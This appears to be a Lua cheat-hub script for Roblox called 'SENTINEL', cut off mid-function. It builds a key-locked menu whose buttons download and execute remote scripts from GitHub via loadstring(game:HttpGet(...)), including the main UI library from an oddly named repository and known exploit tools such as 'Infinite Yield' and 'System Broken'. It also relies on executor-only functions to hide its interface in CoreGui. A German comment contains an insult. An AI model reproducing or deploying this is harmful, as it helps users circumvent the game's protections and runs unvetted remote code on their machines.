-- SENTINEL.CLIENT
-- dein eigenes Script

-- Initialize services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Warte sicher auf LocalPlayer
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- Create unique Loading Screen GUI
local LoadingScreen = Instance.new("ScreenGui")
LoadingScreen.Name = "SentinelLoading"
LoadingScreen.ResetOnSpawn = false
LoadingScreen.IgnoreGuiInset = true
LoadingScreen.DisplayOrder = 10000
LoadingScreen.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Create Background Gradient
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1,0,1,0)
Background.BackgroundTransparency = 1
Background.Parent = LoadingScreen

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10,10,10)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30,30,30)),
})
Gradient.Rotation = 45
Gradient.Parent = Background

-- Title Text (updated style)
local Title = Instance.new("TextLabel")
Title.Text = "SENTINEL"
Title.Font = Enum.Font.GothamSemibold
Title.TextSize = 80
Title.TextColor3 = Color3.fromRGB(0, 120, 255)
Title.BackgroundTransparency = 1
Title.AnchorPoint = Vector2.new(0.5, 0)
Title.Position = UDim2.new(0.5, 0, 0.3, 0)
Title.Size = UDim2.new(0.8, 0, 0.1, 0)
Title.Parent = Background

-- Fade In
for i=1,0,-0.05 do
    Background.BackgroundTransparency = i
    wait(0.03)
end

-- Simulate Loading with Slider (left to right)
local LoadingBarFrame = Instance.new("Frame")
LoadingBarFrame.Size = UDim2.new(0.8, 0, 0.03, 0)
LoadingBarFrame.Position = UDim2.new(0.1, 0, 0.8, 0)
LoadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
LoadingBarFrame.BorderSizePixel = 0
LoadingBarFrame.Parent = Background

-- Label for slider
do
    local label = Instance.new("TextLabel")
    label.Text = "UI Loading"
    label.Font = Enum.Font.GothamSemibold
    label.TextSize = 24
    label.TextColor3 = Color3.fromRGB(0, 120, 255)
    label.BackgroundTransparency = 1
    label.AnchorPoint = Vector2.new(0.5, 1)
    label.Position = UDim2.new(0.5, 0, 0.78, 0)
    label.Size = UDim2.new(0.8, 0, 0.04, 0)
    label.Parent = Background
end

local LoadingBar = Instance.new("Frame")
LoadingBar.Size = UDim2.new(0, 0, 1, 0)
LoadingBar.Position = UDim2.new(0, 0, 0, 0)
LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
LoadingBar.BorderSizePixel = 0
LoadingBar.Parent = LoadingBarFrame

-- Tween LoadingBar from zero to full width
local barTween = TweenService:Create(
    LoadingBar,
    TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false),
    {Size = UDim2.new(1, 0, 1, 0)}
)
barTween:Play()
barTween.Completed:Wait()

-- Fade Out and Destroy
for i=0,1,0.05 do
    Background.BackgroundTransparency = i
    wait(0.03)
end
LoadingScreen:Destroy()

-- Load main script
local UILibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/sentinelso8urcecodesq23e123/sentinelsourceeeeee12313/refs/heads/main/rayfield"))()

-- Create main window with KeySystem aktiviert
local Window = UILibrary:CreateWindow({
    ConfigurationSaving = {
        Enabled = false,
        FileName = "SENTINEL",
    },
    Discord = {
        Enabled = false, -- Discord Prompt deaktiviert
        Invite = "https://discord.gg/FauKM4ev38", -- Discord Invite (ohne discord.gg/)
        RememberJoins = true,
    },
    KeySystem = true, -- <-- KeySystem aktiviert
    KeySettings = {
        Title = "SENTINEL Key System",
        Subtitle = "Gib deinen Key ein",
        Note = "discord for key: https://discord.gg/FauKM4ev38",
        FileName = "SENTINEL_Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"SENTINEL/ON/TOP!"},
    },
    DisableBuildWarnings = false,
    Name = "Welcome | " .. LocalPlayer.Name .. " | by X1MV_SAMET",
    Theme = {
        Shadow = Color3.fromRGB(106, 28, 154),
        SliderProgress = Color3.fromRGB(106, 27, 154),
        PlaceholderColor = Color3.fromRGB(106, 27, 154),
        InputStroke = Color3.fromRGB(106, 27, 154),
        ToggleDisabledStroke = Color3.fromRGB(125, 125, 125),
        InputBackground = Color3.fromRGB(0, 0, 0),
        ElementBackgroundHover = Color3.fromRGB(0, 0, 0),
        DropdownUnselected = Color3.fromRGB(0, 0, 0),
        SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
        NotificationBackground = Color3.fromRGB(0, 0, 0),
        DropdownSelected = Color3.fromRGB(5, 5, 5),
        SecondaryElementStroke = Color3.fromRGB(106, 27, 154),
        Background = Color3.fromRGB(5, 5, 5),
        ToggleDisabledOuterStroke = Color3.fromRGB(106, 27, 154),
        TabStroke = Color3.fromRGB(5, 5, 5),
        ElementBackground = Color3.fromRGB(5, 5, 5),
        ToggleEnabledOuterStroke = Color3.fromRGB(106, 27, 154),
        ToggleEnabled = Color3.fromRGB(106, 27, 154),
        ToggleEnabledStroke = Color3.fromRGB(106, 27, 154),
        ToggleDisabled = Color3.fromRGB(100, 100, 100),
        SecondaryElementBackground = Color3.fromRGB(5, 5, 5),
        ToggleBackground = Color3.fromRGB(5, 5, 5),
        TabTextColor = Color3.fromRGB(125, 125, 125),
        ElementStroke = Color3.fromRGB(106, 27, 154),
        SliderBackground = Color3.fromRGB(5, 5, 5),
        SliderStroke = Color3.fromRGB(106, 27, 154),
        NotificationActionsBackground = Color3.fromRGB(106, 27, 154),
        Topbar = Color3.fromRGB(0, 0, 0),
        TabBackground = Color3.fromRGB(5, 5, 5),
        TabBackgroundSelected = Color3.fromRGB(0, 0, 0),
        TextColor = Color3.fromRGB(106, 27, 154),
    },
})

-- Welcome notification
UILibrary:Notify({
    Duration = 7,
    Content = "SENTINEL ON TOP " .. LocalPlayer.Name,
    Title = "SENTINEL  Loaded!",
})

-- Create tabs
local HomeTab = Window:CreateTab("Home")
HomeTab:CreateDivider()

local MicupTab = Window:CreateTab("Mic Up")
MicupTab:CreateDivider()

local ReanimTab = Window:CreateTab("REANIM")
ReanimTab:CreateDivider()

-- du hurensohn das sind die commands

local Button = HomeTab:CreateButton({
   Name = "Infinitie Yield",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end,
})

local Button = HomeTab:CreateButton({
   Name = "System Broken",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
   end,
})

local Button = HomeTab:CreateButton({
   Name = "Unlimited Baseplate",
   Callback = function()
   local Workspace    = game:GetService("Workspace")
local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")

local player = Players.LocalPlayer

local CONFIG = {
    CELL_SIZE      = 2000,
    HEIGHT         = 0.05,
    TRANSPARENCY   = 0.5,
    BASE_COLOR     = Color3.fromRGB(128,128,128),
    GRID_RADIUS    = 1,
    SPAWN_Y        = 0,
    RESPAWN_THRESH = 50,
}

local generated = {}

local function makeKey(x, z)
    return string.format("%d_%d", x, z)
end

local function spawnPlate(xIndex, zIndex)
    local key = makeKey(xIndex, zIndex)
    if generated[key] then return end
    local worldX = xIndex * CONFIG.CELL_SIZE
    local worldZ = zIndex * CONFIG.CELL_SIZE
    local plate = Instance.new("Part")
    plate.Name         = "Plate_" .. key
    plate.Size         = Vector3.new(CONFIG.CELL_SIZE, CONFIG.HEIGHT, CONFIG.CELL_SIZE)
    plate.Position     = Vector3.new(worldX, CONFIG.SPAWN_Y, worldZ)
    plate.Anchored     = true
    plate.CanCollide   = true
    plate.Material     = Enum.Material.SmoothPlastic
    plate.Color        = CONFIG.BASE_COLOR:Lerp(Color3.new(1,1,1), math.random() * 0.1)
    plate.Transparency = CONFIG.TRANSPARENCY
    plate.Parent       = Workspace
    generated[key] = plate
end

local function updateGrid()
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local pos = char.HumanoidRootPart.Position
    local centerX = math.floor(pos.X / CONFIG.CELL_SIZE)
    local centerZ = math.floor(pos.Z / CONFIG.CELL_SIZE)
    for dx = -CONFIG.GRID_RADIUS, CONFIG.GRID_RADIUS do
        for dz = -CONFIG.GRID_RADIUS, CONFIG.GRID_RADIUS do
            spawnPlate(centerX + dx, centerZ + dz)
        end
    end
end

local function startGridLoop()
    task.spawn(function()
        while task.wait(1) do
            updateGrid()
        end
    end)
    RunService.Heartbeat:Connect(function()
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
        local hrp = char.HumanoidRootPart
        -- Nur respawnen, wenn du weit genug unter die Spawn-Y fÃ¤llst:
        if hrp.Position.Y < (CONFIG.SPAWN_Y - CONFIG.RESPAWN_THRESH) then
            hrp.CFrame = CFrame.new(hrp.Position.X, CONFIG.SPAWN_Y + 1, hrp.Position.Z)
        end
    end)
end

local function createPickerUI()
    local gui = Instance.new("ScreenGui")
    gui.Name         = "ColorPicker"
    gui.ResetOnSpawn = false
    gui.Parent       = player:WaitForChild("PlayerGui")
    
    local overlay = Instance.new("Frame", gui)
    overlay.Size                   = UDim2.new(1, 0, 1, 0)
    overlay.Position               = UDim2.new(0, 0, 0, 0)
    overlay.BackgroundColor3       = Color3.new(0, 0, 0)
    overlay.BackgroundTransparency = 0.5
    
    local frame = Instance.new("Frame", gui)
    frame.Size         = UDim2.new(0, 600, 0, 300)
    frame.Position     = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint  = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel   = 0
    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius     = UDim.new(0, 16)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Thickness        = 2
    stroke.Transparency     = 0.7
    
    local title = Instance.new("TextLabel", frame)
    title.Size                   = UDim2.new(1, 0, 0, 50)
    title.Position               = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text                   = "Select Baseplate Color"
    title.Font                   = Enum.Font.GothamBold
    title.TextSize               = 24
    title.TextColor3             = Color3.fromRGB(255, 255, 255)
    
    local btnContainer = Instance.new("Frame", frame)
    btnContainer.Size           = UDim2.new(1, -40, 1, -70)
    btnContainer.Position       = UDim2.new(0, 20, 0, 60)
    btnContainer.BackgroundTransparency = 1
    local grid = Instance.new("UIGridLayout", btnContainer)
    grid.CellSize               = UDim2.new(0, 100, 0, 100)
    grid.CellPadding            = UDim2.new(0, 10, 0, 10)
    grid.FillDirection          = Enum.FillDirection.Horizontal
    grid.StartCorner            = Enum.StartCorner.TopLeft
    
    local colors = {
        {"Green",   Color3.fromRGB(57,255,20)},
        {"Pink",    Color3.fromRGB(255,20,147)},
        {"Orange",  Color3.fromRGB(255,165,0)},
        {"Purple",  Color3.fromRGB(148,0,211)},
        {"Red",     Color3.fromRGB(255,0,0)},
        {"Cyan",    Color3.fromRGB(0,255,255)},
        {"Magenta", Color3.fromRGB(255,0,255)},
        {"Black",   Color3.fromRGB(0,0,0)},
        {"White",   Color3.fromRGB(255,255,255)},
        {"Lime",    Color3.fromRGB(191,255,0)},
    }
    
    for _, colInfo in ipairs(colors) do
        local name, color = colInfo[1], colInfo[2]
        local btn = Instance.new("TextButton", btnContainer)
        btn.Size                    = UDim2.new(0, 100, 0, 100)
        btn.BackgroundColor3        = color
        btn.BorderSizePixel         = 0
        btn.Text                    = ""
        local btnCorner = Instance.new("UICorner", btn)
        btnCorner.CornerRadius      = UDim.new(0, 12)
        btn.MouseButton1Click:Connect(function()
            CONFIG.BASE_COLOR = color
            gui:Destroy()
            startGridLoop()
        end)
    end
end

-- Starte Farbwahl und Grid-Loop
createPickerUI()
   end,
})

local Button = HomeTab:CreateButton({
   Name = "Emotes",
   Callback = function()
   -- Made by Sucuk
local IsStudio = false

local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")
local AvatarEditorService = game:GetService("AvatarEditorService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
 
local Emotes = {}
local function AddEmote(name: string, id: IntValue, price: IntValuae?)
	if not (name and id) then
		return
	end
 
	table.insert(Emotes, {
		["name"] = name,
		["id"] = id,
		["icon"] = "rbxthumb://type=Asset&id=".. id .."&w=150&h=150",
		["price"] = price or 0,
		["index"] = #Emotes + 1,
		["sort"] = {}
	})
end
local CurrentSort = "newestfirst"
 
local FavoriteOff = "rbxassetid://10651060677"
local FavoriteOn = "rbxassetid://10651061109"
local FavoritedEmotes = {}
 
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Emotes"
ScreenGui.DisplayOrder = 1
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Enabled = false
 
local BackFrame = Instance.new("Frame")
BackFrame.Size = UDim2.new(1.3, 0, 0.9, 0.3)
BackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
BackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
BackFrame.SizeConstraint = Enum.SizeConstraint.RelativeYY
BackFrame.BackgroundTransparency = 1
BackFrame.BorderSizePixel = 0
BackFrame.Parent = ScreenGui
 
local EmoteName = Instance.new("TextLabel")
EmoteName.Name = "EmoteName"
EmoteName.TextScaled = true
EmoteName.AnchorPoint = Vector2.new(0.5, 0.5)
EmoteName.Position = UDim2.new(-0.1, 0, 0.5, 0)
EmoteName.Size = UDim2.new(0.05, 0, 0.05, 0)
EmoteName.SizeConstraint = Enum.SizeConstraint.RelativeYY
EmoteName.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
EmoteName.TextColor3 = Color3.new(1, 1, 1)
EmoteName.BorderSizePixel = 0
EmoteName.Parent = BackFrame
 
local Corner = Instance.new("UICorner")
Corner.Parent = EmoteName
 
local Loading = Instance.new("TextLabel", BackFrame)
Loading.AnchorPoint = Vector2.new(0.5, 0.5)
Loading.Text = "Loading Emote Wheel."
Loading.TextColor3 = Color3.new(1, 1, 1)
Loading.BackgroundColor3 = Color3.new(0, 0, 0)
Loading.TextScaled = true
Loading.BackgroundTransparency = 0.5
Loading.Size = UDim2.fromScale(0.2, 0.1)
Loading.Position = UDim2.fromScale(0.5, 0.2)
Corner:Clone().Parent = Loading
 
local Frame = Instance.new("ScrollingFrame")
Frame.Size = UDim2.new(0.8, 3, 1.2, 1)
Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
Frame.ScrollingDirection = Enum.ScrollingDirection.Y
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 1)
Frame.BackgroundTransparency = 1
Frame.ScrollBarThickness = 5
Frame.BorderSizePixel = 0
Frame.MouseLeave:Connect(function()
	EmoteName.Text = "Select an Emote"
end)
Frame.Parent = BackFrame
 
local Grid = Instance.new("UIGridLayout")
Grid.CellSize = UDim2.new(0.105, 0, 0, 0)
Grid.CellPadding = UDim2.new(0.001, 0, 0.006, 0)
Grid.SortOrder = Enum.SortOrder.LayoutOrder
Grid.Parent = Frame
 
local SortFrame = Instance.new("Frame")
SortFrame.Visible = false
SortFrame.BorderSizePixel = 1
SortFrame.Position = UDim2.new(1, 5, -0.125, 0)
SortFrame.Size = UDim2.new(0.7, 0, 0, 0)
SortFrame.AutomaticSize = Enum.AutomaticSize.Y
SortFrame.BackgroundTransparency = 0.9
Corner:Clone().Parent = SortFrame
SortFrame.Parent = BackFrame
 
local SortList = Instance.new("UIListLayout")
SortList.Padding = UDim.new(0.07, 1)
SortList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SortList.VerticalAlignment = Enum.VerticalAlignment.Top
SortList.SortOrder = Enum.SortOrder.LayoutOrder
SortList.Parent = SortFrame
 
local function SortEmotes()
	for i,Emote in pairs(Emotes) do
		local EmoteButton = Frame:FindFirstChild(Emote.id)
		if not EmoteButton then
			continue
		end
		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 55) or #Emotes)
		EmoteButton.number.Text = Emote.sort[CurrentSort]
	end
end
 
local function createsort(order, text, sort)
	local CreatedSort = Instance.new("TextButton")
	CreatedSort.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CreatedSort.Size = UDim2.new(1, 0, 0.2, 0)
	CreatedSort.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	CreatedSort.LayoutOrder = order
	CreatedSort.TextColor3 = Color3.new(1, 1, 1)
	CreatedSort.Text = text
	CreatedSort.TextScaled = true
	CreatedSort.BorderSizePixel = 0
	Corner:Clone().Parent = CreatedSort
	CreatedSort.Parent = SortFrame
	CreatedSort.MouseButton1Click:Connect(function()
		SortFrame.Visible = false
		CurrentSort = sort
		SortEmotes()
	end)
	return CreatedSort
end
 
createsort(1, "Newest First", "newestfirst")
createsort(2, "Oldest First", "oldestfirst")
createsort(3, "Alphabetically First", "alphabeticfirst")
createsort(4, "Alphabetically Last", "alphabeticlast")
createsort(5, "Highest Price", "highestprice")
createsort(6, "Lowest Price", "lowestprice")
 
local SortButton = Instance.new("TextButton")
SortButton.BorderSizePixel = 0
SortButton.AnchorPoint = Vector2.new(0.5, 0.5)
SortButton.Position = UDim2.new(1, -10, -5, 0)
SortButton.Size = UDim2.new(0.08, 0, 0.04, 0)
SortButton.TextScaled = true
SortButton.TextColor3 = Color3.new(1, 1, 1)
SortButton.BackgroundColor3 = Color3.new(0, 0, 0)
SortButton.BackgroundTransparency = 1
SortButton.Text = "Sort"
SortButton.MouseButton1Click:Connect(function()
	SortFrame.Visible = not SortFrame.Visible
end)
Corner:Clone().Parent = SortButton
SortButton.Parent = BackFrame
 
local CloseButton = Instance.new("TextButton")
CloseButton.BorderSizePixel = 0
CloseButton.AnchorPoint = Vector2.new(0.5, 0.5)
CloseButton.Position = UDim2.new(76, 0, -0.08, 5)
CloseButton.Size = UDim2.new(0.2, 0, 0.04, 0)
CloseButton.TextScaled = true
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundColor3 = Color3.new(0, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "Close"
CloseButton.MouseButton1Click:Connect(function()
	ScreenGui.Enabled = false
end)
Corner:Clone().Parent = CloseButton
CloseButton.Parent = BackFrame
 
local SearchBar = Instance.new("TextBox")
SearchBar.BorderSizePixel = 0
SearchBar.AnchorPoint = Vector2.new(0.5, 0.5)
SearchBar.Position = UDim2.new(1, 0, -0.055, 0)
SearchBar.Size = UDim2.new(0.15, 0, 0.05, 0)
SearchBar.TextScaled = true
SearchBar.PlaceholderText = "Search"
SearchBar.TextColor3 = Color3.new(1, 1, 1)
SearchBar.BackgroundColor3 = Color3.new(0, 0, 0)
SearchBar.BackgroundTransparency = 0.3
SearchBar:GetPropertyChangedSignal("Text"):Connect(function()
	local text = SearchBar.Text:lower()
	local buttons = Frame:GetChildren()
	if text ~= text:sub(1,50) then
		SearchBar.Text = SearchBar.Text:sub(1,50)
		text = SearchBar.Text:lower()
	end
	if text ~= ""  then
		for i,button in pairs(buttons) do
			if button:IsA("GuiButton") then
				local name = button:GetAttribute("name"):lower()
				if name:match(text) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	else
		for i,button in pairs(buttons) do
			if button:IsA("GuiButton") then
				button.Visible = true
			end
		end
	end
end)
Corner:Clone().Parent = SearchBar
SearchBar.Parent = BackFrame
 
-- Add new text label for "made by za1k"
local MadeByLabel = Instance.new("TextLabel")
MadeByLabel.Text = " credits sucuk "
MadeByLabel.TextScaled = true
MadeByLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MadeByLabel.BackgroundTransparency = 0.3
MadeByLabel.TextColor3 = Color3.new(1, 1, 1)
MadeByLabel.BorderSizePixel = 0
MadeByLabel.AnchorPoint = Vector2.new(0.5, 0.5)
MadeByLabel.Position = UDim2.new(1, 0, 1, 0)
MadeByLabel.Size = UDim2.new(0.25, 0, 0.06, 0)
Corner:Clone().Parent = MadeByLabel
MadeByLabel.Parent = BackFrame
 
local function openemotes(name, state, input)
	if state == Enum.UserInputState.Begin then
		ScreenGui.Enabled = not ScreenGui.Enabled
	end
end
 
if IsStudio then
	ContextActionService:BindActionAtPriority(
		"Emote Menu",
		openemotes,
		true,
		2001,
		Enum.KeyCode.Comma
	)
else
	ContextActionService:BindCoreActionAtPriority(
		"Emote Menu",
		openemotes,
		true,
		2001,
		Enum.KeyCode.Comma
	)
end
 
local inputconnect
ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
	if ScreenGui.Enabled == true then
		EmoteName.Text = "Select an Emote"
		SearchBar.Text = ""
		SortFrame.Visible = false
		GuiService:SetEmotesMenuOpen(false)
		inputconnect = UserInputService.InputBegan:Connect(function(input, processed)
			if not processed then
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					ScreenGui.Enabled = false
				end
			end
		end)
	else
		inputconnect:Disconnect()
	end
end)
 
if not IsStudio then
	GuiService.EmotesMenuOpenChanged:Connect(function(isopen)
		if isopen then
			ScreenGui.Enabled = false
		end
	end)
end
 
GuiService.MenuOpened:Connect(function()
	ScreenGui.Enabled = false
end)
 
if not game:IsLoaded() then
	game.Loaded:Wait()
end
 
local LocalPlayer = Players.LocalPlayer
 
if IsStudio then
	ScreenGui.Parent = LocalPlayer.PlayerGui
else
	--thanks inf yield
	local SynV3 = syn and DrawingImmediate
	if (not is_sirhurt_closure) and (not SynV3) and (syn and syn.protect_gui) then
		syn.protect_gui(ScreenGui)
		ScreenGui.Parent = CoreGui
	elseif get_hidden_gui or gethui then
		local hiddenUI = get_hidden_gui or gethui
		ScreenGui.Parent = hiddenUI()
	else
		ScreenGui.Parent = CoreGui
	end
end
 
 
local function SendNotification(title, text)
	if (not IsStudio) and syn and syn.toast_notification then
		syn.toast_notification({
			Type = ToastType.Error,
			Title = title,
			Content = text
		})
	else
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text
		})
	end
end
 
local function HumanoidPlayEmote(humanoid, name, id)
	if IsStudio then
		return humanoid:PlayEmote(name)
	else
		return humanoid:PlayEmoteAndGetAnimTrackById(id)
	end
end
 
local function PlayEmote(name: string, id: IntValue)
    -- ScreenGui.Enabled = false -- This line is now commented out so the panel won't close.
    SearchBar.Text = ""
    local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local Description = Humanoid and Humanoid:FindFirstChildOfClass("HumanoidDescription")
    if not Description then
        return
    end
    if LocalPlayer.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
        local succ, err = pcall(function()
            HumanoidPlayEmote(Humanoid, name, id)
        end)
        if not succ then
            Description:AddEmote(name, id)
            HumanoidPlayEmote(Humanoid, name, id)
        end
    else
        SendNotification("r6? lol", "you gotta be r15 dude")
    end
end
 
local function WaitForChildOfClass(parent, class)
	local child = parent:FindFirstChildOfClass(class)
	while not child or child.ClassName ~= class do
		child = parent.ChildAdded:Wait()
	end
	return child
end
 
local params = CatalogSearchParams.new()
params.AssetTypes = {Enum.AvatarAssetType.EmoteAnimation}
params.SortType = Enum.CatalogSortType.RecentlyCreated
params.SortAggregation = Enum.CatalogSortAggregation.AllTime
params.IncludeOffSale = true
params.CreatorName = "Roblox"
params.Limit = 120
 
local function getCatalogPage()
	local success, catalogPage = pcall(function()
		return AvatarEditorService:SearchCatalog(params)
	end)
	if not success then
		task.wait(5)
		return getCatalogPage()
	end
	return catalogPage
end
 
local catalogPage = getCatalogPage()
 
local pages = {}
 
while true do
	local currentPage = catalogPage:GetCurrentPage()
	table.insert(pages, currentPage)
	if catalogPage.IsFinished then
		break
	end
	local function AdvanceToNextPage()
		local success = pcall(function()
			catalogPage:AdvanceToNextPageAsync()
		end)
		if not success then
			task.wait(5)
			return AdvanceToNextPage()
		end
	end
	AdvanceToNextPage()
end
 
local totalEmotes = {}
for _, page in pairs(pages) do
	for _, emote in pairs(page) do
		table.insert(totalEmotes, emote)
	end
end
 
for i, Emote in pairs(totalEmotes) do
	AddEmote(Emote.Name, Emote.Id, Emote.Price)
end
 
--unreleased emotes
AddEmote("Arm Wave", 5915773155)
AddEmote("Head Banging", 5915779725)
AddEmote("Face Calisthenics", 9830731012)
 
--finished loading
Loading:Destroy()
 
--sorting options setup
table.sort(Emotes, function(a, b)
	return a.index < b.index
end)
for i,v in pairs(Emotes) do
	v.sort.newestfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.index > b.index
end)
for i,v in pairs(Emotes) do
	v.sort.oldestfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.name:lower() < b.name:lower()
end)
for i,v in pairs(Emotes) do
	v.sort.alphabeticfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.name:lower() > b.name:lower()
end)
for i,v in pairs(Emotes) do
	v.sort.alphabeticlast = i
end
 
table.sort(Emotes, function(a, b)
	return a.price < b.price
end)
for i,v in pairs(Emotes) do
	v.sort.lowestprice = i
end
 
table.sort(Emotes, function(a, b)
	return a.price > b.price
end)
for i,v in pairs(Emotes) do
	v.sort.highestprice = i
end
 
 
local function IsFileFunc(...)
	if IsStudio then
		return
	elseif isfile then
		return isfile(...)
	end
end
 
local function WriteFileFunc(...)
	if IsStudio then
		return
	elseif writefile then
		return writefile(...)
	end
end
 
local function ReadFileFunc(...)
	if IsStudio then
		return
	elseif readfile then
		return readfile(...)
	end
end
 
if not IsStudio then
	if IsFileFunc("FavoritedEmotes.txt") then
		if not pcall(function()
			FavoritedEmotes = HttpService:JSONDecode(ReadFileFunc("FavoritedEmotes.txt"))
		end) then
			FavoritedEmotes = {}
		end
	else
		WriteFileFunc("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
	end
end
 
 
local function CharacterAdded(Character)
	for i,v in pairs(Frame:GetChildren()) do
		if not v:IsA("UIGridLayout") then
			v:Destroy()
		end
	end
	local Humanoid = WaitForChildOfClass(Character, "Humanoid")
	local Description = Humanoid:WaitForChild("HumanoidDescription", 5) or Instance.new("HumanoidDescription", Humanoid)
	local random = Instance.new("TextButton")
	local Ratio = Instance.new("UIAspectRatioConstraint")
	Ratio.AspectType = Enum.AspectType.ScaleWithParentSize
	Ratio.Parent = random
	random.LayoutOrder = 0
	random.TextColor3 = Color3.new(1, 1, 1)
	random.BorderSizePixel = 0
	random.BackgroundTransparency = 0.3
	random.BackgroundColor3 = Color3.new(0, 0, 0)
	random.TextScaled = true
	random.Text = "Random"
	random:SetAttribute("name", "")
	Corner:Clone().Parent = random
	random.MouseButton1Click:Connect(function()
		local randomemote = Emotes[math.random(1, #Emotes)]
		PlayEmote(randomemote.name, randomemote.id)
	end)
	random.MouseEnter:Connect(function()
		EmoteName.Text = "Random"
	end)
	random.Parent = Frame
	for i,Emote in pairs(Emotes) do
		Description:AddEmote(Emote.name, Emote.id)
		local EmoteButton = Instance.new("ImageButton")
		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 0) or #Emotes)
		EmoteButton.Name = Emote.id
		EmoteButton:SetAttribute("name", Emote.name)
		Corner:Clone().Parent = EmoteButton
		EmoteButton.Image = Emote.icon
		EmoteButton.BackgroundTransparency = 0.5
		EmoteButton.BackgroundColor3 = Color3.new(0, 0, 0)
		EmoteButton.BorderSizePixel = 0
		Ratio:Clone().Parent = EmoteButton
		local EmoteNumber = Instance.new("TextLabel")
		EmoteNumber.Name = "number"
		EmoteNumber.TextScaled = true
		EmoteNumber.BackgroundTransparency = 1
		EmoteNumber.TextColor3 = Color3.new(255, 255, 255)
		EmoteNumber.BorderSizePixel = 0
		EmoteNumber.AnchorPoint = Vector2.new(0.5, 0.5)
		EmoteNumber.Size = UDim2.new(0.2, 0, 0.2, 0)
		EmoteNumber.Position = UDim2.new(0.1, 0, 0.9, 0)
		EmoteNumber.Text = Emote.sort[CurrentSort]
		EmoteNumber.TextXAlignment = Enum.TextXAlignment.Center
		EmoteNumber.TextYAlignment = Enum.TextYAlignment.Center
		local UIStroke = Instance.new("UIStroke")
		UIStroke.Transparency = 1
		UIStroke.Parent = EmoteNumber
		EmoteNumber.Parent = EmoteButton
		EmoteButton.Parent = Frame
		EmoteButton.MouseButton1Click:Connect(function()
			PlayEmote(Emote.name, Emote.id)
		end)
		EmoteButton.MouseEnter:Connect(function()
			EmoteName.Text = Emote.name
		end)
		local Favorite = Instance.new("ImageButton")
		Favorite.Name = "favorite"
		if table.find(FavoritedEmotes, Emote.id) then
			Favorite.Image = FavoriteOn
		else
			Favorite.Image = FavoriteOff
		end
		Favorite.AnchorPoint = Vector2.new(0.5, 0.5)
		Favorite.Size = UDim2.new(0.1, 0, 0.1, 0)
		Favorite.Position = UDim2.new(0.9, 0, 0.9, 0)
		Favorite.BorderSizePixel = 0
		Favorite.BackgroundTransparency = 1
		Favorite.Parent = EmoteButton
		Favorite.MouseButton1Click:Connect(function()
			local index = table.find(FavoritedEmotes, Emote.id)
			if index then
				table.remove(FavoritedEmotes, index)
				Favorite.Image = FavoriteOff
				EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + #Emotes
			else
				table.insert(FavoritedEmotes, Emote.id)
				Favorite.Image = FavoriteOn
				EmoteButton.LayoutOrder = Emote.sort[CurrentSort]
			end
			WriteFileFunc("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
		end)
	end
